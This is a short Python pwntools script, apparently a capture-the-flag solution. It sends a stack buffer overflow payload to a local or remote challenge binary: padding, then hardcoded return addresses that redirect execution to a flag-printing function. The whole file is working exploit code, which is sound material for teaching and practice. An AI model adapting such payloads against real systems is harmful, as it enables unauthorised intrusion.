#!/usr/bin/python3

import pwn
import sys


if __name__ == '__main__':
	answer, target = 0, None

	if len(sys.argv) < 2:
		print(f'usage: {__file__} <ip> <port>')
		exit(1)
	elif len(sys.argv) != 3:
		target = pwn.process(sys.argv[1])				# use local file
	else:
		server, port = sys.argv[1], int(sys.argv[2])
		target = pwn.remote(server, port)				# connect to the server

	mainrbp, retaddr = pwn.p64(0x7fffffffd9e0), pwn.p64(0x401a11)
	useless, putflag = pwn.p64(0x4a3e10), pwn.p64(0x4017f5)
	payload = b'A' * 16 + mainrbp + retaddr + useless + putflag
	target.sendline(payload)

	print(target.recvuntil(b'name?').decode("utf-8", "ignore"))
	print(payload)
	print(target.recvall().decode("utf-8", "ignore").strip())